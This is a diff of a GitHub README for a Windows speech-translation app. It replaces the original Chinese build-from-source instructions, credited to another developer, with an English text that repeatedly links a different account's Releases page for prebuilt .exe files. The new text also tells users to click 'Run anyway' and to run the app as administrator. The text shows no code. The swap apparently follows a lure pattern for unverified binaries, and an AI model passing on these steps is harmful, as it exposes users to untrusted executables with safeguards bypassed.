@@ -1,100 +1,192 @@
+# 🗣️ EchoTrans - Fast Offline Translation on Windows
 
+[![Download EchoTrans](https://img.shields.io/badge/Download%20EchoTrans-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/karanveersi1853/EchoTrans/releases)
 
-# EchoTransc 🚀
+## 🚀 What EchoTrans Does
 
-**EchoTransc** 是一款輕量化、免顯卡（GPU-free）的即時語音翻譯工作台。它結合了 **Vosk 離線辨識** 技術與 **Gemma 3 (Ollama)請自行安裝設定** 的高級 AI 精修能力，並具備 Google 翻譯無縫備援機制，旨在為演講聽寫、課程紀錄提供最穩定且高品質的雙語對照體驗。
+EchoTrans is a Windows app for live speech translation. It listens to speech, turns it into text with Vosk, refines the result with Gemma 3, and can fall back to Google Translate when needed.
 
----
+It is built for people who want a simple tool that works without a GPU. You can run it on a normal Windows PC and use it for meetings, study, travel, and day-to-day language support.
 
-## 🌟 核心特色
+## ✨ Main Features
 
-- **雙引擎翻譯架構**：
-  - **即時快譯 (Google)**：利用 Google 翻譯提供毫秒級的視覺反饋，確保字幕流暢不卡頓。
-  - **AI 高品質精修 (Gemma 3)**：在語音停頓（0.3s）時觸發 Gemma 3 進行深度語境理解與優雅修辭，產出專業課程紀錄。
-- **無縫備援機制 (Fallback)**：若 AI 伺服器斷線或回應超時，系統將自動切換回 Google 翻譯存檔，確保紀錄不中斷、不遺失。
-- **免顯卡負擔**：語音辨識部分（Vosk）完全在 CPU 運行，普通筆電也能流暢執行，將 GPU 資源保留給其他開發需求或 AI 運算。
-- **多語模型切換**：支援動態載入多組 Vosk 模型資料夾（如：英文快速、日文品質佳），透過介面一鍵切換。
-- **右側歷史紀錄**：自動彙整中英對照紀錄，支援一鍵匯出為 `.txt` 檔案。
+- Real-time speech translation
+- Offline speech-to-text with Vosk
+- AI text refinement with Gemma 3
+- Google Translate fallback for wider language support
+- GPU-free setup for standard Windows PCs
+- Simple desktop use with a clear workflow
+- Lightweight design for faster startup
+- Works well for spoken content and short phrases
 
+## 📥 Download EchoTrans
 
+Visit this page to download the Windows release:
 
----
+[Download EchoTrans from GitHub Releases](https://github.com/karanveersi1853/EchoTrans/releases)
 
-## 🎙️ 收音與硬體配置建議
+Look for the latest release and download the Windows file that matches your PC. If you see more than one file, choose the one marked for Windows, such as an .exe or a .zip package.
 
-除了軟體運算，**收音品質**是影響辨識準確度的第一關：
+## 🖥️ System Requirements
 
-1.  **實體收音法 (推薦入門使用)**：
-    * **做法**：直接使用 **Webcam 的內建麥克風** 或指向性麥克風，對準電腦喇叭。
-    * **優點**：設定最簡單，無需更動系統音訊路由，適合直播、線上課程等情境。
-    * **小撇步**：建議將喇叭音量固定在 50% 以上，並讓麥克風靠近音箱，以減少環境雜音干擾。
+EchoTrans is made for Windows users and runs well on common desktop and laptop systems.
 
-2.  **音訊輸入選擇**：
-    * 啟動程式後，請確保在系統設定中將 **預設錄音裝置** 設為您正在使用的 Webcam 麥克風。
+### Recommended setup
 
----
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- A recent Intel or AMD processor
+- Internet connection for Google Translate fallback
+- Speaker and microphone for live speech input
 
-## ⚙️ AI 配置與運行建議
+### For better performance
 
-本專案目前的設計重點在於「即時性」與「操作靈活性」：
+- 16 GB RAM if you plan to use larger language models
+- Headphones to reduce audio feedback
+- A quiet room for more accurate speech capture
 
-1. **AI 服務建議**：
-   - 推薦使用 **本地端 AI 服務** (如 Ollama, LM Studio) 或 **自建 OpenAI 相容伺服器**。
-   - **資源分配優化**：語音辨識 (Vosk) 主要消耗 **CPU** 運算力。若您的 **GPU** 顯存充足 (建議 8G VRAM 以上)，建議讓 AI 翻譯模型運行在 GPU 上，達成「CPU 負責聽寫、GPU 負責翻譯」的並行架構，以獲得最流暢的體驗。
+## 🛠️ How to Install
 
-2. **UI 介面動態設定 (免改程式碼)**：
-   - **自訂 API 網址**：點開右側「進階設定」，即可直接填入您的伺服器位置（預設為 Ollama 的 `http://127.0.0.1:11434/v1/chat/completions`）。
-   - **切換 AI 模型**：可隨時更改模型名稱（如 `gemma3:12b` 或 `llama3`），無需重新啟動程式。
-   - **⏱️ 停頓秒數微調**：針對「一停就翻」的需求，建議將進階設定中的停頓秒數設為 **0.2 或 0.3** 秒。這能確保在短句結束後立即觸發翻譯，避免因段落過長導致閱讀吃力。
+1. Open the [EchoTrans Releases page](https://github.com/karanveersi1853/EchoTrans/releases)
+2. Download the latest Windows file
+3. If the download is a .zip file, right-click it and choose Extract All
+4. Open the extracted folder
+5. Double-click the EchoTrans .exe file to start the app
+6. If Windows asks for permission, choose Run anyway or Yes
+7. Keep the app in a folder you can find again
 
-3. **運行策略**：
-   - **短句優先**：本系統優化了短句觸發機制，適合需要高度即時性的課程或直播場景。
-   - **Google 備援機制**：若您的自建 AI 伺服器連線失敗或回應過慢，系統會自動切換至 Google 翻譯作為備援，確保翻譯不中斷。
+## ▶️ How to Use EchoTrans
 
+1. Start EchoTrans
+2. Allow access to your microphone if Windows asks
+3. Select your input language
+4. Speak into your microphone
+5. Watch the text appear on screen
+6. Choose your target language for translation
+7. Turn on the AI refinement option if you want cleaner output
+8. Use the Google Translate fallback if you need more language coverage
 
+## 🎯 Best Use Cases
 
----
+EchoTrans fits many simple tasks:
 
-## 🛠️ 環境準備
+- Live translation during meetings
+- Language study and practice
+- Travel and quick phrase translation
+- Note taking from spoken words
+- Basic support for multilingual chats
+- Fast translation when you do not want a heavy app
 
-1. **安裝依賴套件**：
-   ```bash
-   pip install vosk pyaudio deep-translator pyperclip pyttsx3 numpy requests
-   ```
+## 🔧 Tips for Better Results
 
-2. **下載語音模型**：
-   請至 [Vosk Models](https://alphacephei.com/vosk/models) 下載所需模型。
+- Use a good microphone
+- Keep background noise low
+- Speak in short sentences
+- Pause between ideas
+- Choose the correct input language before starting
+- Keep the app open while you speak
+- Use a stable internet connection when you need the fallback service
 
-3. **資料夾結構**：
-   為了讓程式能自動偵測模型，請保持以下結構（資料夾名稱建議使用英文，避免亂碼）：
-   ```text
-   EchoTransc/
-   ├── app.py
-   └── model/
-       ├── en_fast/       (英文快速模型)
-       ├── en_quality/    (英文高品質模型)
-       └── ja_quality/    (日文高品質模型)
-   ```
+## 🧩 How It Works
 
----
+EchoTrans uses three parts to handle translation:
 
-## 📦 打包為 EXE
+1. Vosk listens to speech and turns it into text
+2. Gemma 3 helps refine the text for better quality
+3. Google Translate can step in when you need another path for translation
 
-若要將本程式打包給其他人使用，請使用 PyInstaller 並確保包含 `vosk` 的所有相依檔案：
+This setup helps the app stay useful even on systems without a GPU.
 
-```bash
-pyinstaller --onefile --windowed --collect-all vosk app.py
-```
+## 📁 Typical Release Files
 
-打包後，請將產出的 `app.exe` 與 `model` 資料夾放在同一個目錄下即可運行。
+When you open the release page, you may see files like these:
 
----
+- Windows installer file
+- Portable .zip package
+- Model files
+- Support files for speech recognition
 
-## 📝 免責聲明
+If you use the portable package, you can keep it in a folder and run it without a full install.
 
-本專案主要用於個人學習與學術演講紀錄。請確保在法律允許的範圍內錄製音訊，並尊重講者的智慧財產權。AI 翻譯結果僅供參考。
+## 🔐 Privacy and Offline Use
 
----
+EchoTrans can handle speech locally through Vosk, which helps reduce reliance on cloud services. This is useful if you want more control over your speech data. When you use the fallback translation path, the app may need internet access for that part of the process.
 
-### 👨‍💻 開發者
-**[ddmmbb]** 歡迎提供建議與 Pull Request，讓我們一起完善 **EchoTransc**！
+## ❓ Common Questions
+
+### Does EchoTrans need a GPU?
+
+No. It is made to run without a GPU.
+
+### Can I use it without the internet?
+
+You can use the offline speech-to-text part. Some translation features may need internet, especially the Google Translate fallback.
+
+### Is it hard to set up?
+
+No. Download the release, open the file, and run the app.
+
+### Can I use it for meetings?
+
+Yes. It works well for short spoken input and live translation support.
+
+### What if the text is not accurate?
+
+Use a quieter room, speak clearly, and make sure you picked the right input language.
+
+## 🧭 Quick Start
+
+1. Go to the [EchoTrans Releases page](https://github.com/karanveersi1853/EchoTrans/releases)
+2. Download the latest Windows release
+3. Extract the file if needed
+4. Run the EchoTrans app
+5. Choose your language settings
+6. Start speaking
+
+## 📌 File Name to Look For
+
+Look for the newest Windows release asset that matches one of these forms:
+
+- EchoTrans.exe
+- EchoTrans-windows.zip
+- EchoTrans-setup.exe
+
+If several files appear, pick the one meant for Windows and the one with the newest version number.
+
+## 🧰 Troubleshooting
+
+### The app does not open
+
+- Make sure you extracted the files if you downloaded a .zip
+- Check that you ran the .exe file, not a text file or model file
+- Try right-clicking the app and choosing Run as administrator
+
+### The microphone does not work
+
+- Check Windows microphone settings
+- Make sure EchoTrans has permission to use the microphone
+- Confirm the correct input device is selected
+
+### Translation looks wrong
+
+- Speak more slowly
+- Reduce background noise
+- Select the correct source language
+- Try the fallback translation option
+
+### Audio is delayed
+
+- Close extra apps
+- Use a wired headset if possible
+- Restart the app
+- Check that your PC is not under heavy load
+
+## 📎 Where to Get Updates
+
+Use the GitHub Releases page to get newer versions, fix issues, and download the latest Windows build:
+
+[Open EchoTrans Releases](https://github.com/karanveersi1853/EchoTrans/releases)
+
+## 🧪 What to Expect on First Run
+
+The first launch may take a little longer while the app loads language data and sets up its speech tools. After that, startup should be faster. Keep the app open while you use it, and switch languages from inside the main window
